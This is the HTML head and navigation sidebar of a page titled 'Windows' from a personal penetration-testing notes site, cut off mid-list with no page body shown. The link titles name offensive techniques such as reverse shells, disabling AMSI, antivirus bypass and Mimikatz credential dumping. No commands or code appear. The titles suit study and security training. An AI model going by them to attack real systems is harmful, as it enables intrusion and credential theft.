<!DOCTYPE html>
<html lang="en"><head><title>Windows</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto Sans Mono&amp;family=Noto Sans:wght@400;700&amp;family=Noto Sans:ital,wght@0,400;0,600;1,400;1,600&amp;display=swap"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta property="og:title" content="Windows"/><meta property="og:description" content="Basics Common user types Transclude of common-windows-user-types Important local service accounts Transclude of windows-local-service-accounts Permissions Transclude of windows-permissions Paths Transclude of unquoted-path-handling-in-windows Startup Startup folder Transclude of windows-startup-folder ..."/><meta property="og:image" content="https://cardboard-iguana.com/grimoire/static/og-image.png"/><meta property="og:width" content="1200"/><meta property="og:height" content="675"/><link rel="icon" href="../static/icon.png"/><meta name="description" content="Basics Common user types Transclude of common-windows-user-types Important local service accounts Transclude of windows-local-service-accounts Permissions Transclude of windows-permissions Paths Transclude of unquoted-path-handling-in-windows Startup Startup folder Transclude of windows-startup-folder ..."/><meta name="generator" content="Quartz"/><link href="../index.css" rel="stylesheet" type="text/css" spa-preserve/><script src="../prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("../static/contentIndex.json").then(data => data.json())</script></head><body data-slug="spellbook/windows"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"><h1 class="page-title"><a href="..">Cardboard Iguana Security</a></h1><div class="spacer mobile-only"></div><div class="search"><div id="search-icon"><p>Search</p><div></div><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search</title><desc id="desc">Search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg></div><div id="search-container"><div id="search-space"><input autocomplete="off" id="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div id="search-layout" data-preview="true"></div></div></div></div><div class="explorer desktop-only"><button type="button" id="explorer" data-behavior="collapse" data-collapsed="open" data-savestate="true" data-tree="[{&quot;path&quot;:&quot;commentaries&quot;,&quot;collapsed&quot;:false},{&quot;path&quot;:&quot;spellbook&quot;,&quot;collapsed&quot;:false},{&quot;path&quot;:&quot;spells&quot;,&quot;collapsed&quot;:false},{&quot;path&quot;:&quot;tales&quot;,&quot;collapsed&quot;:false}]"><h1>Explorer</h1><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="explorer-content"><ul class="overflow" id="explorer-ul"><li><div class="folder-outer open"><ul style="padding-left:0;" class="content" data-folderul><li><div class="folder-outer open"><ul style="padding-left:0;" class="content" data-folderul></ul></div></li><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="commentaries"><button class="folder-button"><span class="folder-title">Commentaries</span></button></div></div><div class="folder-outer open"><ul style="padding-left:1.4rem;" class="content" data-folderul="commentaries"><li><a href="../commentaries/2022-08-15-notes-from-hope-and-def-con" data-for="commentaries/2022-08-15-notes-from-hope-and-def-con">Notes from HOPE and DEF CON</a></li><li><a href="../commentaries/2022-11-27-trying-and-failing-to-deploy-a-smart-contract-using-an-ipad-pro" data-for="commentaries/2022-11-27-trying-and-failing-to-deploy-a-smart-contract-using-an-ipad-pro">Trying (and failing) to deploy a smart contract using an iPad Pro</a></li></ul></div></li><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="spellbook"><button class="folder-button"><span class="folder-title">Spellbook</span></button></div></div><div class="folder-outer open"><ul style="padding-left:1.4rem;" class="content" data-folderul="spellbook"><li><a href="../spellbook/admin-like-windows-permissions" data-for="spellbook/admin-like-windows-permissions">Admin-like Windows permissions</a></li><li><a href="../spellbook/aix" data-for="spellbook/aix">AIX</a></li><li><a href="../spellbook/arp" data-for="spellbook/arp">ARP</a></li><li><a href="../spellbook/as-rep-roasting" data-for="spellbook/as-rep-roasting">AS-REP roasting</a></li><li><a href="../spellbook/bash" data-for="spellbook/bash">Bash</a></li><li><a href="../spellbook/burp-suite" data-for="spellbook/burp-suite">Burp Suite</a></li><li><a href="../spellbook/certutil" data-for="spellbook/certutil">certutil</a></li><li><a href="../spellbook/cifs" data-for="spellbook/cifs">CIFS</a></li><li><a href="../spellbook/cisco-ios" data-for="spellbook/cisco-ios">Cisco IOS</a></li><li><a href="../spellbook/classic-windows-login-and-lock-screen-hacks" data-for="spellbook/classic-windows-login-and-lock-screen-hacks">Classic Windows login and lock screen hacks</a></li><li><a href="../spellbook/common-ipv4-addresses" data-for="spellbook/common-ipv4-addresses">Common IPv4 addresses</a></li><li><a href="../spellbook/xss-attacks" data-for="spellbook/xss-attacks">Cross-site scripting (XSS) attacks</a></li><li><a href="../spellbook/custom-rules-in-john-the-ripper" data-for="spellbook/custom-rules-in-john-the-ripper">Custom rules in John the Ripper</a></li><li><a href="../spellbook/evil-winrm" data-for="spellbook/evil-winrm">Evil-WinRM</a></li><li><a href="../spellbook/ffmpeg" data-for="spellbook/ffmpeg">ffmpeg</a></li><li><a href="../spellbook/find" data-for="spellbook/find">find</a></li><li><a href="../spellbook/find-file-metadata-flags" data-for="spellbook/find-file-metadata-flags">find file metadata flags</a></li><li><a href="../spellbook/ftp" data-for="spellbook/ftp">FTP (protocol)</a></li><li><a href="../spellbook/fuff" data-for="spellbook/fuff">fuff</a></li><li><a href="../spellbook/gdb" data-for="spellbook/gdb">gdb</a></li><li><a href="../spellbook/gemini-compatible-markdown" data-for="spellbook/gemini-compatible-markdown">“Gemini compatible” Markdown</a></li><li><a href="../spellbook/get-winevent" data-for="spellbook/get-winevent">Get-WinEvent</a></li><li><a href="../spellbook/get-winevent-filterhashtable" data-for="spellbook/get-winevent-filterhashtable">Get-WinEvent FilterHashtable</a></li><li><a href="../spellbook/hashcat" data-for="spellbook/hashcat">Hashcat</a></li><li><a href="../spellbook/how-to-automate-netlify-builds-with-ifttt" data-for="spellbook/how-to-automate-netlify-builds-with-ifttt">How to automate Netlify builds with IFTTT</a></li><li><a href="../spellbook/how-to-bypass-the-powershell-execution-policy" data-for="spellbook/how-to-bypass-the-powershell-execution-policy">How to bypass the PowerShell execution policy</a></li><li><a href="../spellbook/how-to-compact-vm-disk-images" data-for="spellbook/how-to-compact-vm-disk-images">How to compact VM disk images</a></li><li><a href="../spellbook/how-to-create-a-gpg-key-with-ssh-support" data-for="spellbook/how-to-create-a-gpg-key-with-ssh-support">How to create a GPG Key (with SSH support!)</a></li><li><a href="../spellbook/how-to-disable-amsi" data-for="spellbook/how-to-disable-amsi">How to disable AMSI</a></li><li><a href="../spellbook/how-to-exploit-python-pickles" data-for="spellbook/how-to-exploit-python-pickles">How to exploit Python pickles</a></li><li><a href="../spellbook/how-to-exploit-windows-services" data-for="spellbook/how-to-exploit-windows-services">How to exploit Windows services</a></li><li><a href="../spellbook/how-to-exploit-windows-tasks" data-for="spellbook/how-to-exploit-windows-tasks">How to exploit Windows tasks</a></li><li><a href="../spellbook/how-to-get-an-ssl-certificate" data-for="spellbook/how-to-get-an-ssl-certificate">How to get an SSL certificate</a></li><li><a href="../spellbook/how-to-load-a-shell-with-a-simple-executable" data-for="spellbook/how-to-load-a-shell-with-a-simple-executable">How to load a shell with a simple executable</a></li><li><a href="../spellbook/how-to-manipulate-local-windows-services" data-for="spellbook/how-to-manipulate-local-windows-services">How to manipulate local Windows services</a></li><li><a href="../spellbook/how-to-manipulate-local-windows-tasks" data-for="spellbook/how-to-manipulate-local-windows-tasks">How to manipulate local Windows tasks</a></li><li><a href="../spellbook/how-to-manipulate-remote-windows-services" data-for="spellbook/how-to-manipulate-remote-windows-services">How to manipulate remote Windows services</a></li><li><a href="../spellbook/how-to-match-files-to-packages" data-for="spellbook/how-to-match-files-to-packages">How to match files to packages</a></li><li><a href="../spellbook/how-to-remotely-install-a-windows-package-with-powershell" data-for="spellbook/how-to-remotely-install-a-windows-package-with-powershell">How to remotely install a Windows package with PowerShell</a></li><li><a href="../spellbook/how-to-remove-duplicate-lines-in-bash" data-for="spellbook/how-to-remove-duplicate-lines-in-bash">How to remove duplicate lines in Bash</a></li><li><a href="../spellbook/how-to-retrieve-aix-fileset-information" data-for="spellbook/how-to-retrieve-aix-fileset-information">How to retrieve AIX fileset information</a></li><li><a href="../spellbook/how-to-run-a-remote-windows-command-using-powershell" data-for="spellbook/how-to-run-a-remote-windows-command-using-powershell">How to run a remote Windows command using PowerShell</a></li><li><a href="../spellbook/how-to-set-the-PATH-in-a-session" data-for="spellbook/how-to-set-the-PATH-in-a-session">How to set the PATH in a session</a></li><li><a href="../spellbook/how-to-set-up-wmi-in-powershell" data-for="spellbook/how-to-set-up-wmi-in-powershell">How to set up WMI in PowerShell</a></li><li><a href="../spellbook/how-to-use-an-alternate-ssh-key-with-git" data-for="spellbook/how-to-use-an-alternate-ssh-key-with-git">How to use an alternate SSH key with Git</a></li><li><a href="../spellbook/how-to-use-mimikatz-to-dump-kerberos-tickets" data-for="spellbook/how-to-use-mimikatz-to-dump-kerberos-tickets">How to use Mimikatz to dump Kerberos tickets</a></li><li><a href="../spellbook/how-to-use-a-raspberry-pi-4b-as-hacking-accessory" data-for="spellbook/how-to-use-a-raspberry-pi-4b-as-hacking-accessory">How to use a Raspberry Pi 4B as hacking accessory</a></li><li><a href="../spellbook/how-to-use-windows-remote-management" data-for="spellbook/how-to-use-windows-remote-management">How to use Windows Remote Management</a></li><li><a href="../spellbook/html-applications" data-for="spellbook/html-applications">HTML applications</a></li><li><a href="../spellbook/http" data-for="spellbook/http">HTTP</a></li><li><a href="../spellbook/hydra" data-for="spellbook/hydra">Hydra</a></li><li><a href="../spellbook/impacket" data-for="spellbook/impacket">Impacket</a></li><li><a href="../spellbook/invoke-mimikatz" data-for="spellbook/invoke-mimikatz">Invoke-Mimikatz</a></li><li><a href="../spellbook/ios-quirks" data-for="spellbook/ios-quirks">iOS quirks</a></li><li><a href="../spellbook/ios-shortcuts-quirks" data-for="spellbook/ios-shortcuts-quirks">iOS Shortcuts quirks</a></li><li><a href="../spellbook/ipv4" data-for="spellbook/ipv4">IPv4</a></li><li><a href="../spellbook/java" data-for="spellbook/java">Java</a></li><li><a href="../spellbook/john-the-ripper" data-for="spellbook/john-the-ripper">John the Ripper</a></li><li><a href="../spellbook/json-web-tokens" data-for="spellbook/json-web-tokens">JSON Web Tokens (JWTs)</a></li><li><a href="../spellbook/kerberoasting" data-for="spellbook/kerberoasting">Kerberoasting</a></li><li><a href="../spellbook/kerberos" data-for="spellbook/kerberos">Kerberos</a></li><li><a href="../spellbook/kerberos-authentication-process" data-for="spellbook/kerberos-authentication-process">Kerberos authentication process</a></li><li><a href="../spellbook/kerbrute" data-for="spellbook/kerbrute">Kerbrute</a></li><li><a href="../spellbook/linux" data-for="spellbook/linux">Linux</a></li><li><a href="../spellbook/linux-reconnaissance" data-for="spellbook/linux-reconnaissance">Linux reconnaissance</a></li><li><a href="../spellbook/local-file-inclusion-attacks" data-for="spellbook/local-file-inclusion-attacks">Local file inclusion (LFI) attacks</a></li><li><a href="../spellbook/local-port-forwarding-with-ssh" data-for="spellbook/local-port-forwarding-with-ssh">Local port forwarding with SSH</a></li><li><a href="../spellbook/metasploit" data-for="spellbook/metasploit">Metasploit</a></li><li><a href="../spellbook/metasploit-module-usage-basics" data-for="spellbook/metasploit-module-usage-basics">Metasploit module usage basics</a></li><li><a href="../spellbook/meterpreter" data-for="spellbook/meterpreter">meterpreter</a></li><li><a href="../spellbook/mimikatz" data-for="spellbook/mimikatz">Mimikatz</a></li><li><a href="../spellbook/msfconsole" data-for="spellbook/msfconsole">msfconsole</a></li><li><a href="../spellbook/msfvenom" data-for="spellbook/msfvenom">msfvenom</a></li><li><a href="../spellbook/ms-sql" data-for="spellbook/ms-sql">MS SQL</a></li><li><a href="../spellbook/netcat" data-for="spellbook/netcat">ncat</a></li><li><a href="../spellbook/net" data-for="spellbook/net">net</a></li><li><a href="../spellbook/netcat-reverse-shells" data-for="spellbook/netcat-reverse-shells">netcat reverse shells</a></li><li><a href="../spellbook/nfs" data-for="spellbook/nfs">NFS</a></li><li><a href="../spellbook/nmap" data-for="spellbook/nmap">Nmap</a></li><li><a href="../spellbook/nmap-flags" data-for="spellbook/nmap-flags">Nmap flags</a></li><li><a href="../spellbook/ntlm-hashes" data-for="spellbook/ntlm-hashes">NTLM hashes</a></li><li><a href="../spellbook/owasp-zap" data-for="spellbook/owasp-zap">OWASP ZAP</a></li><li><a href="../spellbook/php" data-for="spellbook/php">PHP</a></li><li><a href="../spellbook/php-local-file-inclusion-attacks" data-for="spellbook/php-local-file-inclusion-attacks">PHP local file inclusion attacks</a></li><li><a href="../spellbook/poison-null-byte-attack" data-for="spellbook/poison-null-byte-attack">Poison null byte attack</a></li><li><a href="../spellbook/polkit" data-for="spellbook/polkit">Polkit</a></li><li><a href="../spellbook/powercat" data-for="spellbook/powercat">Powercat</a></li><li><a href="../spellbook/powershell" data-for="spellbook/powershell">PowerShell</a></li><li><a href="../spellbook/powerview" data-for="spellbook/powerview">PowerView</a></li><li><a href="../spellbook/python" data-for="spellbook/python">Python</a></li><li><a href="../spellbook/rubeus" data-for="spellbook/rubeus">Rubeus</a></li><li><a href="../spellbook/server-configuration-data-ipv4-address" data-for="spellbook/server-configuration-data-ipv4-address">Server donfiguration data IPv4 address</a></li><li><a href="../spellbook/sip" data-for="spellbook/sip">SIP</a></li><li><a href="../spellbook/sip-methods" data-for="spellbook/sip-methods">SIP methods</a></li><li><a href="../spellbook/smbclient" data-for="spellbook/smbclient">smbclient</a></li><li><a href="../spellbook/socat" data-for="spellbook/socat">socat</a></li><li><a href="../spellbook/sql-injection-attacks" data-for="spellbook/sql-injection-attacks">SQL injection attacks</a></li><li><a href="../spellbook/ssh" data-for="spellbook/ssh">SSH</a></li><li><a href="../spellbook/tcp" data-for="spellbook/tcp">TCP</a></li><li><a href="../spellbook/tcp-headers" data-for="spellbook/tcp-headers">TCP headers</a></li><li><a href="../spellbook/tcp-model" data-for="spellbook/tcp-model">TCP model</a></li><li><a href="../spellbook/unix-permissions" data-for="spellbook/unix-permissions">UNIX permissions</a></li><li><a href="../spellbook/useful-scripts-for-windows-reconnaissance" data-for="spellbook/useful-scripts-for-windows-reconnaissance">Useful scripts for Windows reconnaissance</a></li><li><a href="../spellbook/vim" data-for="spellbook/vim">ViM</a></li><li><a href="../spellbook/visual-basic" data-for="spellbook/visual-basic">Visual Basic</a></li><li><a href="../spellbook/visual-basic-for-applications" data-for="spellbook/visual-basic-for-applications">Visual Basic for Applications</a></li><li><a href="../spellbook/windows" data-for="spellbook/windows">Windows</a></li><li><a href="../spellbook/windows-event-logs" data-for="spellbook/windows-event-logs">Windows event logs</a></li><li><a href="../spellbook/windows-reconnaissance-with-powershell" data-for="spellbook/windows-reconnaissance-with-powershell">Windows reconnaissance with PowerShell</a></li><li><a href="../spellbook/windows-services" data-for="spellbook/windows-services">Windows services</a></li><li><a href="../spellbook/wireshark" data-for="spellbook/wireshark">Wireshark</a></li><li><a href="../spellbook/wmic" data-for="spellbook/wmic">wmic</a></li><li><a href="../spellbook/xxe-attacks" data-for="spellbook/xxe-attacks">XML external entity (XXE) attacks</a></li><li><a href="../spellbook/youtube-dl" data-for="spellbook/youtube-dl">youtube-dl</a></li></ul></div></li><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="spells"><button class="folder-button"><span class="folder-title">spells</span></button></div></div><div class="folder-outer open"><ul style="padding-left:1.4rem;" class="content" data-folderul="spells"><li><a href="../spells/abusing-wildcard-expansion-in-bash" data-for="spells/abusing-wildcard-expansion-in-bash">Abusing wildcard expansion in Bash</a></li><li><a href="../spells/adding-and-setting-variables-in-ios-shortcuts" data-for="spells/adding-and-setting-variables-in-ios-shortcuts">Adding and setting variables in iOS Shortcuts</a></li><li><a href="../spells/aircrack-ng" data-for="spells/aircrack-ng">Aircrack-NG</a></li><li><a href="../spells/all-in-one-windows-reverse-shell-with-powercat" data-for="spells/all-in-one-windows-reverse-shell-with-powercat">All-in-one Windows reverse shell with Powercat</a></li><li><a href="../spells/arp-scanning" data-for="spells/arp-scanning">ARP scanning</a></li><li><a href="../spells/as-rep-roasting-with-impacket" data-for="spells/as-rep-roasting-with-impacket">AS-REP roasting with Impacket</a></li><li><a href="../spells/as-rep-roasting-with-rubeus" data-for="spells/as-rep-roasting-with-rubeus">AS-REP roasting With Rubeus</a></li><li><a href="../spells/awk" data-for="spells/awk">awk</a></li><li><a href="../spells/basenc" data-for="spells/basenc">basenc</a></li><li><a href="../spells/bash-reverse-shell" data-for="spells/bash-reverse-shell">Bash reverse shell</a></li><li><a href="../spells/bash-scripting" data-for="spells/bash-scripting">Bash scripting</a></li><li><a href="../spells/boolean-based-sqli" data-for="spells/boolean-based-sqli">Boolean-based SQLi</a></li><li><a href="../spells/burp-suite-decoder" data-for="spells/burp-suite-decoder">Burp Suite Decoder</a></li><li><a href="../spells/burp-suite-intruder-battering-ram-attacks" data-for="spells/burp-suite-intruder-battering-ram-attacks">Burp Suite Intruder Battering Ram attacks</a></li><li><a href="../spells/burp-suite-intruder-cluster-bomb-attacks" data-for="spells/burp-suite-intruder-cluster-bomb-attacks">Burp Suite Intruder Cluster Bomb attacks</a></li><li><a href="../spells/burp-suite-intruder-pitchfork-attacks" data-for="spells/burp-suite-intruder-pitchfork-attacks">Burp Suite Intruder Pitchfork attacks</a></li><li><a href="../spells/burp-suite-intruder-sniper-attacks" data-for="spells/burp-suite-intruder-sniper-attacks">Burp Suite Intruder Sniper attacks</a></li><li><a href="../spells/burp-suite-keyboard-shortcuts" data-for="spells/burp-suite-keyboard-shortcuts">Burp Suite keyboard shortcuts</a></li><li><a href="../spells/burp-suite-macros" data-for="spells/burp-suite-macros">Burp Suite macros</a></li><li><a href="../spells/cat" data-for="spells/cat">cat</a></li><li><a href="../spells/cewl" data-for="spells/cewl">cewl</a></li><li><a href="../spells/cifs-reconnaissance-with-nmap" data-for="spells/cifs-reconnaissance-with-nmap">CIFS reconnaissance with Nmap</a></li><li><a href="../spells/cisco-ios-general-configuration-commands" data-for="spells/cisco-ios-general-configuration-commands">Cisco IOS general configuration commands</a></li><li><a href="../spells/cisco-ios-interface-configuration-commands" data-for="spells/cisco-ios-interface-configuration-commands">Cisco IOS interface configuration commands</a></li><li><a href="../spells/cisco-ios-line-configuration-commands" data-for="spells/cisco-ios-line-configuration-commands">Cisco IOS line (login) configuration commands</a></li><li><a href="../spells/cisco-ios-system-information-commands" data-for="spells/cisco-ios-system-information-commands">Cisco IOS system information commands</a></li><li><a href="../spells/common-http-headers" data-for="spells/common-http-headers">Common HTTP headers</a></li><li><a href="../spells/common-meterpreter-commands" data-for="spells/common-meterpreter-commands">Common meterpreter commands</a></li><li><a href="../spells/common-msfconsole-commands" data-for="spells/common-msfconsole-commands">Common msfconsole commands</a></li><li><a href="../spells/common-nmap-long-flags" data-for="spells/common-nmap-long-flags">Common Nmap long flags</a></li><li><a href="../spells/common-nmap-short-flags" data-for="spells/common-nmap-short-flags">Common Nmap short flags</a></li><li><a href="../spells/common-video-resolutions" data-for="spells/common-video-resolutions">Common video resolutions</a></li><li><a href="../spells/common-windows-user-types" data-for="spells/common-windows-user-types">Common Windows user types</a></li><li><a href="../spells/comparison-of-the-tcp-and-osi-models" data-for="spells/comparison-of-the-tcp-and-osi-models">Comparison of the TCP and OSI models</a></li><li><a href="../spells/crackmapexec" data-for="spells/crackmapexec">crackmapexec</a></li><li><a href="../spells/cupp" data-for="spells/cupp">CUPP</a></li><li><a href="../spells/cve-2021-3560" data-for="spells/cve-2021-3560">CVE-2021-3560</a></li><li><a href="../spells/cve-2021-4034" data-for="spells/cve-2021-4034">CVE-2021-4034 (“Pwnkit”)</a></li><li><a href="../spells/dcerpc" data-for="spells/dcerpc">DCERPC</a></li><li><a href="../spells/debugging-bash-scripts" data-for="spells/debugging-bash-scripts">Debugging Bash scripts</a></li><li><a href="../spells/default-cifs-shares" data-for="spells/default-cifs-shares">Default CIFS shares</a></li><li><a href="../spells/different-ip-address-representations" data-for="spells/different-ip-address-representations">Different IP address representations</a></li><li><a href="../spells/dig" data-for="spells/dig">dig</a></li><li><a href="../spells/dir" data-for="spells/dir">dir</a></li><li><a href="../spells/domain-enumeration-with-powerview" data-for="spells/domain-enumeration-with-powerview">Domain enumeration with PowerView</a></li><li><a href="../spells/drsuapi" data-for="spells/drsuapi">DRSUAPI</a></li><li><a href="../spells/dynamic-port-forwarding-with-ssh" data-for="spells/dynamic-port-forwarding-with-ssh">Dynamic port forwarding with SSH</a></li><li><a href="../spells/easy-reverse-dns-lookups" data-for="spells/easy-reverse-dns-lookups">Easy reverse DNS lookups</a></li><li><a href="../spells/enum4linux" data-for="spells/enum4linux">enum4linux</a></li><li><a href="../spells/equivalent-burp-suite-and-owasp-zap-functionality" data-for="spells/equivalent-burp-suite-and-owasp-zap-functionality">Equivalent Burp Suite and OWASP ZAP functionality</a></li><li><a href="../spells/equivalent-socat-and-netcat-commands" data-for="spells/equivalent-socat-and-netcat-commands">Equivalent socat and netcat commands</a></li><li><a href="../spells/equivalent-windows-and-nix-commands" data-for="spells/equivalent-windows-and-nix-commands">Equivalent Windows and *NIX commands</a></li><li><a href="../spells/error-based-sqli" data-for="spells/error-based-sqli">Error-based SQLi</a></li><li><a href="../spells/evading-anti-xss-filtering" data-for="spells/evading-anti-xss-filtering">Evading anti-XSS filtering</a></li><li><a href="../spells/file-transfers-in-evil-winrm" data-for="spells/file-transfers-in-evil-winrm">File transfers in Evil-WinRM</a></li><li><a href="../spells/filter-files-based-on-file-permissions-in-find" data-for="spells/filter-files-based-on-file-permissions-in-find">Filter files based on file permissions in find</a></li><li><a href="../spells/filter-files-based-on-ownership-in-find" data-for="spells/filter-files-based-on-ownership-in-find">Filter files based on ownership in find</a></li><li><a href="../spells/filter-files-based-on-size-in-find" data-for="spells/filter-files-based-on-size-in-find">Filter files based on size in find</a></li><li><a href="../spells/filter-files-based-on-timestamp-in-find" data-for="spells/filter-files-based-on-timestamp-in-find">Filter files based on timestamp in find</a></li><li><a href="../spells/find-shell-escape" data-for="spells/find-shell-escape">find shell escape</a></li><li><a href="../spells/findstr" data-for="spells/findstr">findstr</a></li><li><a href="../spells/finger" data-for="spells/finger">finger</a></li><li><a href="../spells/ftp-application" data-for="spells/ftp-application">ftp (application)</a></li><li><a href="../spells/ftp-commands" data-for="spells/ftp-commands">FTP commands</a></li><li><a href="../spells/ftps" data-for="spells/ftps">FTPS</a></li><li><a href="../spells/general-gdb-commands" data-for="spells/general-gdb-commands">General gdb commands</a></li><li><a href="../spells/get-filehash" data-for="spells/get-filehash">Get-FileHash</a></li><li><a href="../spells/get-winevent-filterhashtable-keywords" data-for="spells/get-winevent-filterhashtable-keywords">Get-WinEvent FilterHashtable keywords</a></li><li><a href="../spells/get-winevent-filterhashtable-log-levels" data-for="spells/get-winevent-filterhashtable-log-levels">Get-WinEvent FilterHashtable log levels</a></li><li><a href="../spells/gobuster" data-for="spells/gobuster">gobuster</a></li><li><a href="../spells/golden-and-silver-tickets" data-for="spells/golden-and-silver-tickets">Golden and silver tickets</a></li><li><a href="../spells/grep" data-for="spells/grep">grep</a></li><li><a href="../spells/harvester" data-for="spells/harvester">Harvester</a></li><li><a href="../spells/hashcat-combinator" data-for="spells/hashcat-combinator">Hashcat combinator</a></li><li><a href="../spells/hashcat-password-hash-types" data-for="spells/hashcat-password-hash-types">Hashcat password hash types</a></li><li><a href="../spells/helpful-metasploit-modules-to-use-with-meterpreter" data-for="spells/helpful-metasploit-modules-to-use-with-meterpreter">Helpful Metasploit modules to use with meterpreter</a></li><li><a href="../spells/how-to-access-the-windows-registry-using-powershell" data-for="spells/how-to-access-the-windows-registry-using-powershell">How to access the Windows Registry using PowerShell</a></li><li><a href="../spells/how-to-add-windows-users-at-the-command-line" data-for="spells/how-to-add-windows-users-at-the-command-line">How to add Windows users at the command line</a></li><li><a href="../spells/how-to-attack-json-apis-with-hydra" data-for="spells/how-to-attack-json-apis-with-hydra">How to attack JSON APIs with Hydra</a></li><li><a href="../spells/how-to-automatically-stabilize-a-reverse-shell-with-socat" data-for="spells/how-to-automatically-stabilize-a-reverse-shell-with-socat">How to automatically stabilize a reverse shell with socat</a></li><li><a href="../spells/how-to-avoid-dropping-privileges-with-suid-bash" data-for="spells/how-to-avoid-dropping-privileges-with-suid-bash">How to avoid dropping privileges with SUID Bash</a></li><li><a href="../spells/how-to-backdoor-visual-basic-scripts" data-for="spells/how-to-backdoor-visual-basic-scripts">How to backdoor Visual Basic Scripts</a></li><li><a href="../spells/how-to-brute-force-http-logins-with-hydra" data-for="spells/how-to-brute-force-http-logins-with-hydra">How to brute force HTTP logins with Hydra</a></li><li><a href="../spells/how-to-brute-force-login-credentials-with-fuff" data-for="spells/how-to-brute-force-login-credentials-with-fuff">How to brute force login credentials with fuff</a></li><li><a href="../spells/how-to-brute-force-virtual-host-entries-with-fuff" data-for="spells/how-to-brute-force-virtual-host-entries-with-fuff">How to brute force virtual host entries with fuff</a></li><li><a href="../spells/how-to-brute-force-weak-jwt-secrets" data-for="spells/how-to-brute-force-weak-jwt-secrets">How to brute force weak JWT secrets</a></li><li><a href="../spells/how-to-bulk-edit-windows-permissions" data-for="spells/how-to-bulk-edit-windows-permissions">How to bulk edit Windows permissions</a></li><li><a href="../spells/how-to-bypass-windows-antivirus-with-c-sharp" data-for="spells/how-to-bypass-windows-antivirus-with-c-sharp">How to bypass Windows antivirus with C#</a></li><li><a href="../spells/how-to-calculate-a-file-hash-on-windows-with-certutil" data-for="spells/how-to-calculate-a-file-hash-on-windows-with-certutil">How to calculate a file hash on Windows with certutil</a></li><li><a href="../spells/how-to-call-mimikatz-from-a-meterpreter-shell" data-for="spells/how-to-call-mimikatz-from-a-meterpreter-shell">How to call Mimikatz from a meterpreter shell</a></li><li><a href="../spells/how-to-change-a-branch-name-in-git" data-for="spells/how-to-change-a-branch-name-in-git">How to change a branch name in Git</a></li><li><a href="../spells/how-to-change-a-key-passphrase-with-openssl" data-for="spells/how-to-change-a-key-passphrase-with-openssl">How to change a key passphrase with OpenSSL</a></li><li><a href="../spells/how-to-change-an-ssh-key-passphrase" data-for="spells/how-to-change-an-ssh-key-passphrase">How to change an SSH Key passphrase</a></li><li><a href="../spells/how-to-change-a-user-password-with-rubeus" data-for="spells/how-to-change-a-user-password-with-rubeus">How to change a user’s password with Rubeus</a></li><li><a href="../spells/how-to-compact-a-libvirt-disk-image" data-for="spells/how-to-compact-a-libvirt-disk-image">How to compact a libVirt disk image</a></li><li><a href="../spells/how-to-compact-a-virtualbox-linux-guest-disk-image" data-for="spells/how-to-compact-a-virtualbox-linux-guest-disk-image">How to compact a VirtualBox Linux guest disk image</a></li><li><a href="../spells/how-to-compact-a-virtualbox-windows-guest-disk-image" data-for="spells/how-to-compact-a-virtualbox-windows-guest-disk-image">How to compact a VirtualBox Windows guest disk image</a></li><li><a href="../spells/how-to-confirm-the-existence-of-a-gmail-address" data-for="spells/how-to-confirm-the-existence-of-a-gmail-address">How to confirm the existence of a Gmail address</a></li><li><a href="../spells/how-to-convert-from-m4a-to-mp3-using-ffmpeg" data-for="spells/how-to-convert-from-m4a-to-mp3-using-ffmpeg">How to convert from M4A to MP3 using ffmpeg</a></li><li><a href="../spells/how-to-convert-from-mp4-to-gif-using-ffmpeg" data-for="spells/how-to-convert-from-mp4-to-gif-using-ffmpeg">How to convert from MP4 to GIF using ffmpeg</a></li><li><a href="../spells/how-to-convert-from-mp4-to-webp-using-ffmpeg" data-for="spells/how-to-convert-from-mp4-to-webp-using-ffmpeg">How to convert from MP4 to WebP using ffmpeg</a></li><li><a href="../spells/how-to-create-a-gold-or-silver-ticket-with-mimikatz" data-for="spells/how-to-create-a-gold-or-silver-ticket-with-mimikatz">How to create a gold or silver ticket with Mimikatz</a></li><li><a href="../spells/how-to-create-a-KDC-skeleton-key-with-mimikatz" data-for="spells/how-to-create-a-KDC-skeleton-key-with-mimikatz">How to create a KDC skeleton key with Mimikatz</a></li><li><a href="../spells/how-to-dump-cleartext-passwords-with-mimikatz" data-for="spells/how-to-dump-cleartext-passwords-with-mimikatz">How to dump cleartext passwords with Mimikatz</a></li><li><a href="../spells/how-to-dump-ntlm-hashes-from-the-local-sam-with-mimikatz" data-for="spells/how-to-dump-ntlm-hashes-from-the-local-sam-with-mimikatz">How to dump NTLM hashes from the local SAM with Mimikatz</a></li><li><a href="../spells/how-to-dump-ntlm-hashes-from-lsass-with-mimikatz" data-for="spells/how-to-dump-ntlm-hashes-from-lsass-with-mimikatz">How to dump NTLM hashes from LSASS with Mimikatz</a></li><li><a href="../spells/how-to-encrypt-a-reverse-shell-connection-with-socat" data-for="spells/how-to-encrypt-a-reverse-shell-connection-with-socat">How to encrypt a reverse shell connection with socat</a></li><li><a 